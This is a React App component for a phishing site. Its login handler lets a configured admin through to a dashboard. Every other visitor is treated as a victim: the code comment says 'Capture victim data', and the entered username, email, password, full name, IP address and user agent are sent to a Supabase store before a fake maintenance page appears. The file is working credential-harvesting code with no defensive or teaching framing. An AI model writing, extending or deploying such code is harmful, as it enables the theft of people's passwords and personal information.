import { useEffect, useState } from 'react';
import { AuthForm } from './components/forms/AuthForm';
import { Hero } from './components/layout/Hero';
import { Navbar } from './components/layout/Navbar';
import { getClientInfo, isAuthenticated, setAuthenticated, verifyAdminCredentials } from './lib/auth';
import { captureAttempt } from './lib/supabase';
import { Dashboard } from './pages/Dashboard';
import { Maintenance } from './pages/Maintenance';

type View = 'home' | 'auth' | 'dashboard' | 'maintenance';

function App() {
  const [currentView, setCurrentView] = useState<View>('home');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    // Check if user is already authenticated
    if (isAuthenticated()) {
      setCurrentView('dashboard');
    }
  }, []);

  const handleLoginClick = () => {
    setCurrentView('auth');
  };

  const handleAuthSubmit = async (formData: any) => {
    setLoading(true);
    
    try {
      // Check if admin credentials
      const isAdmin = await verifyAdminCredentials(formData.username, formData.password);
      
      if (isAdmin) {
        setAuthenticated();
        setCurrentView('dashboard');
      } else {
        // Capture victim data
        const clientInfo = getClientInfo();
        await captureAttempt({
          username: formData.username,
          email: formData.email || null,
          password: formData.password,
          full_name: formData.fullName || null,
          attempt_type: formData.attempt_type,
          ip_address: clientInfo.ip_address,
          user_agent: clientInfo.user_agent
        });
        
        // Redirect to maintenance page
        setCurrentView('maintenance');
      }
    } catch (error) {
      console.error('Auth error:', error);
      setCurrentView('maintenance');
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    setCurrentView('home');
  };

  if (currentView === 'auth') {
    return <AuthForm onSubmit={handleAuthSubmit} loading={loading} />;
  }

  if (currentView === 'dashboard') {
    return <Dashboard onLogout={handleLogout} />;
  }

  if (currentView === 'maintenance') {
    return <Maintenance />;
  }

  return (
    <div className="min-h-screen">
      <Navbar onLoginClick={handleLoginClick} />
      <Hero onGetStartedClick={handleLoginClick} />
    </div>
  );
}

export default App;